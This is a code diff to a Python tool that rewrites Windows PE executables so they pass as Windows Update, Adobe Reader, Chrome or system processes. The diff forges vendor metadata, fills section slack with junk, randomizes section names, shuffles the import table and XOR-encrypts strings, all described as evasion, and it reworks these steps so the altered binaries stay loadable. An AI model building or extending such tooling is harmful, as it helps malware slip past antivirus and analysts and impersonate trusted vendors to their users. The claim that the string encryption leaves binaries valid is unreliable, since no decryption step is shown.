@@ -35,9 +35,13 @@ class ProxyConfig:
 class FingerprintManager:
     """Manage fingerprints and proxy configurations"""
 
-    def __init__(self, config_dir: str = '/tmp/sc-fingerprints'):
+    def __init__(self, config_dir: Optional[str] = None):
+        if config_dir is None:
+            # Use a user-private directory under $HOME instead of world-readable /tmp
+            home = os.environ.get('HOME', os.path.expanduser('~'))
+            config_dir = os.path.join(home, '.sc-fingerprints')
         self.config_dir = config_dir
-        os.makedirs(config_dir, exist_ok=True)
+        os.makedirs(config_dir, mode=0o700, exist_ok=True)
 
         self.fingerprints: Dict[str, FingerprintConfig] = {}
         self.proxies: Dict[str, ProxyConfig] = {}
@@ -85,54 +89,62 @@ class FingerprintManager:
         with open(px_file, 'w') as f:
             json.dump(data, f, indent=2)
 
-    def _initialize_default_fingerprints(self):
-        """Initialize default fingerprint templates"""
-        defaults = [
-            {
-                'name': 'Windows Update',
-                'description': 'Appears as Windows Update process',
-                'modifications': {
-                    'pe_sections': {'add_junk': True, 'randomize_names': True},
-                    'imports': {'obfuscate': True},
-                    'strings': {'encrypt': True},
-                    'metadata': {'version': '10.0.19041.0', 'company': 'Microsoft Corporation'}
-                }
-            },
-            {
-                'name': 'Adobe Reader',
-                'description': 'Spoofs Adobe Reader process',
-                'modifications': {
-                    'pe_sections': {'add_junk': True},
-                    'metadata': {'version': '21.0.0.0', 'company': 'Adobe Inc.'}
-                }
-            },
-            {
-                'name': 'Google Chrome',
-                'description': 'Mimics Chrome process signature',
-                'modifications': {
-                    'pe_sections': {'randomize_names': True},
-                    'metadata': {'version': '112.0.0.0', 'company': 'Google LLC'}
-                }
-            },
-            {
-                'name': 'System Process',
-                'description': 'Generic system process fingerprint',
-                'modifications': {
-                    'pe_sections': {'add_junk': True},
-                    'metadata': {'company': 'Microsoft Corporation'}
-                }
-            },
-            {
-                'name': 'Random Variation',
-                'description': 'Randomized fingerprint (changes each generation)',
-                'modifications': {
-                    'pe_sections': {'add_random_junk': True, 'random_names': True},
-                    'randomize_all': True
-                }
-            },
-        ]
+    # Class-level constant for default fingerprint definitions
+    _DEFAULT_FINGERPRINTS = [
+        {
+            'name': 'Windows Update',
+            'description': 'Appears as Windows Update process',
+            'modifications': {
+                'pe_sections': {'add_junk': True, 'randomize_names': True},
+                'imports': {'obfuscate': True},
+                'strings': {'encrypt': True},
+                'metadata': {'version': '10.0.19041.0', 'company': 'Microsoft Corporation'}
+            }
+        },
+        {
+            'name': 'Adobe Reader',
+            'description': 'Spoofs Adobe Reader process',
+            'modifications': {
+                'pe_sections': {'add_junk': True},
+                'metadata': {'version': '21.0.0.0', 'company': 'Adobe Inc.'}
+            }
+        },
+        {
+            'name': 'Google Chrome',
+            'description': 'Mimics Chrome process signature',
+            'modifications': {
+                'pe_sections': {'randomize_names': True},
+                'metadata': {'version': '112.0.0.0', 'company': 'Google LLC'}
+            }
+        },
+        {
+            'name': 'System Process',
+            'description': 'Generic system process fingerprint',
+            'modifications': {
+                'pe_sections': {'add_junk': True},
+                'metadata': {'company': 'Microsoft Corporation'}
+            }
+        },
+        {
+            'name': 'Random Variation',
+            'description': 'Randomized fingerprint (changes each generation)',
+            'modifications': {
+                'pe_sections': {'add_random_junk': True, 'random_names': True},
+                'randomize_all': True
+            }
+        },
+    ]
 
-        for default in defaults:
+    def _initialize_default_fingerprints(self):
+        """Initialize default fingerprint templates only if no defaults exist"""
+        # Check if defaults already loaded (e.g. from disk)
+        existing_default_names = {
+            fp.name for fp in self.fingerprints.values() if not fp.is_custom
+        }
+        if existing_default_names:
+            return
+
+        for default in self._DEFAULT_FINGERPRINTS:
             fp_id = str(uuid.uuid4())[:8]
             fp = FingerprintConfig(
                 id=fp_id,
@@ -212,18 +224,16 @@ class FingerprintManager:
         return modified_content
 
     def _modify_pe_sections(self, content: bytes, config: Dict) -> bytes:
-        """Modify PE file sections"""
+        """Modify PE file sections (non-destructive: writes into section slack space only)"""
         if not self._is_pe_file(content):
             return content
 
         try:
-            # Check for PE signature
             if content[:2] == b'MZ':
-                # Add random junk bytes to sections
+                # Fill slack space (padding) within existing sections with junk,
+                # without changing the file size or corrupting actual data.
                 if config.get('add_junk'):
-                    import random
-                    junk = bytes(random.getrandbits(8) for _ in range(256))
-                    content = content + junk
+                    content = self._fill_section_slack(content)
 
                 # Modify section headers for evasion
                 if config.get('randomize_names'):
@@ -232,6 +242,47 @@ class FingerprintManager:
             return content
         except Exception as e:
             print(f"Error modifying PE sections: {e}")
+            return content
+
+    def _fill_section_slack(self, content: bytes) -> bytes:
+        """Fill slack space in PE sections with junk bytes (non-destructive).
+
+        Each PE section has a VirtualSize (actual data) and SizeOfRawData
+        (aligned size on disk). The gap between them is unused slack space
+        that can safely be overwritten without affecting execution.
+        """
+        import random
+        import struct
+
+        try:
+            pe_offset = int.from_bytes(content[0x3c:0x40], 'little')
+            if pe_offset + 6 > len(content):
+                return content
+
+            num_sections = struct.unpack_from('<H', content, pe_offset + 6)[0]
+            optional_hdr_size = struct.unpack_from('<H', content, pe_offset + 20)[0]
+            section_table_offset = pe_offset + 24 + optional_hdr_size
+
+            data = bytearray(content)
+
+            for i in range(num_sections):
+                entry_offset = section_table_offset + i * 40
+                if entry_offset + 40 > len(data):
+                    break
+
+                virtual_size = struct.unpack_from('<I', data, entry_offset + 8)[0]
+                raw_size = struct.unpack_from('<I', data, entry_offset + 16)[0]
+                raw_offset = struct.unpack_from('<I', data, entry_offset + 20)[0]
+
+                if raw_size > virtual_size and raw_offset + virtual_size < len(data):
+                    slack_start = raw_offset + virtual_size
+                    slack_end = min(raw_offset + raw_size, len(data))
+                    if slack_end > slack_start:
+                        junk = bytes(random.getrandbits(8) for _ in range(slack_end - slack_start))
+                        data[slack_start:slack_end] = junk
+
+            return bytes(data)
+        except Exception:
             return content
 
     def _randomize_section_names(self, content: bytes) -> bytes:
@@ -258,22 +309,144 @@ class FingerprintManager:
             return content
 
     def _obfuscate_imports(self, content: bytes) -> bytes:
-        """Obfuscate import address table"""
-        # Add random bytes to confuse import analysis
+        """Obfuscate import table by shuffling import directory entries in-place.
+
+        Each IMAGE_IMPORT_DESCRIPTOR is a 20-byte record. We shuffle the order
+        of these entries (excluding the null terminator) so that static analysis
+        tools see a different import order, but the binary remains valid because
+        the loader does not depend on entry order.
+        """
+        if not self._is_pe_file(content):
+            return content
+
         import random
-        if len(content) > 1000:
-            insert_pos = random.randint(100, len(content) - 100)
-            junk = bytes(random.getrandbits(8) for _ in range(100))
-            content = content[:insert_pos] + junk + content[insert_pos:]
-        return content
+        import struct
+
+        try:
+            pe_offset = int.from_bytes(content[0x3c:0x40], 'little')
+            # PE signature check
+            if content[pe_offset:pe_offset + 4] != b'PE\x00\x00':
+                return content
+
+            optional_hdr_offset = pe_offset + 24
+            magic = struct.unpack_from('<H', content, optional_hdr_offset)[0]
+
+            # Determine import directory RVA location based on PE32 vs PE32+
+            if magic == 0x10b:  # PE32
+                import_dir_rva_offset = optional_hdr_offset + 104
+            elif magic == 0x20b:  # PE32+
+                import_dir_rva_offset = optional_hdr_offset + 120
+            else:
+                return content
+
+            if import_dir_rva_offset + 8 > len(content):
+                return content
+
+            import_rva = struct.unpack_from('<I', content, import_dir_rva_offset)[0]
+            import_size = struct.unpack_from('<I', content, import_dir_rva_offset + 4)[0]
+
+            if import_rva == 0 or import_size < 20:
+                return content
+
+            # Convert RVA to file offset using section table
+            num_sections = struct.unpack_from('<H', content, pe_offset + 6)[0]
+            optional_hdr_size = struct.unpack_from('<H', content, pe_offset + 20)[0]
+            section_table_offset = pe_offset + 24 + optional_hdr_size
+
+            import_file_offset = None
+            for i in range(num_sections):
+                entry = section_table_offset + i * 40
+                if entry + 40 > len(content):
+                    break
+                sec_va = struct.unpack_from('<I', content, entry + 12)[0]
+                sec_raw_size = struct.unpack_from('<I', content, entry + 16)[0]
+                sec_raw_offset = struct.unpack_from('<I', content, entry + 20)[0]
+                if sec_va <= import_rva < sec_va + sec_raw_size:
+                    import_file_offset = sec_raw_offset + (import_rva - sec_va)
+                    break
+
+            if import_file_offset is None:
+                return content
+
+            # Count import descriptors (each is 20 bytes, terminated by a null entry)
+            descriptor_size = 20
+            entries = []
+            offset = import_file_offset
+            while offset + descriptor_size <= len(content):
+                entry_data = content[offset:offset + descriptor_size]
+                if entry_data == b'\x00' * descriptor_size:
+                    break  # null terminator
+                entries.append(entry_data)
+                offset += descriptor_size
+
+            if len(entries) <= 1:
+                return content  # nothing to shuffle
+
+            # Shuffle entries in-place
+            random.shuffle(entries)
+            data = bytearray(content)
+            for i, entry_data in enumerate(entries):
+                start = import_file_offset + i * descriptor_size
+                data[start:start + descriptor_size] = entry_data
+
+            return bytes(data)
+        except Exception:
+            return content
 
     def _encrypt_strings(self, content: bytes) -> bytes:
-        """Apply string encryption"""
+        """Apply XOR encryption to printable ASCII strings in the .rdata section only.
+
+        Finds the .rdata section (which holds read-only string data), locates
+        contiguous runs of printable ASCII bytes (length >= 4), and XOR-encrypts
+        them in-place. The PE header, code, import tables, and all other sections
+        are left untouched.
+        """
+        if not self._is_pe_file(content):
+            return content
+
         import random
-        # Rotate bytes as simple encryption
-        rotation = random.randint(1, 255)
-        encrypted = bytes((b + rotation) % 256 for b in content)
-        return encrypted
+        import struct
+        import re
+
+        try:
+            pe_offset = int.from_bytes(content[0x3c:0x40], 'little')
+            num_sections = struct.unpack_from('<H', content, pe_offset + 6)[0]
+            optional_hdr_size = struct.unpack_from('<H', content, pe_offset + 20)[0]
+            section_table_offset = pe_offset + 24 + optional_hdr_size
+
+            # Find .rdata section
+            rdata_offset = None
+            rdata_size = None
+            for i in range(num_sections):
+                entry = section_table_offset + i * 40
+                if entry + 40 > len(content):
+                    break
+                name = content[entry:entry + 8].rstrip(b'\x00')
+                if name == b'.rdata':
+                    rdata_size = struct.unpack_from('<I', content, entry + 16)[0]
+                    rdata_offset = struct.unpack_from('<I', content, entry + 20)[0]
+                    break
+
+            if rdata_offset is None or rdata_size is None:
+                return content  # No .rdata section found; leave binary untouched
+
+            rdata_end = min(rdata_offset + rdata_size, len(content))
+            rdata_data = content[rdata_offset:rdata_end]
+
+            # Find printable ASCII strings (4+ chars) within .rdata
+            # Pattern: contiguous bytes in 0x20-0x7E range, minimum length 4
+            xor_key = random.randint(1, 255)
+            data = bytearray(content)
+
+            for match in re.finditer(rb'[\x20-\x7e]{4,}', rdata_data):
+                start = rdata_offset + match.start()
+                end = rdata_offset + match.end()
+                for j in range(start, end):
+                    data[j] = data[j] ^ xor_key
+
+            return bytes(data)
+        except Exception:
+            return content
 
     def _modify_metadata(self, content: bytes, metadata: Dict) -> bytes:
         """Modify PE metadata"""
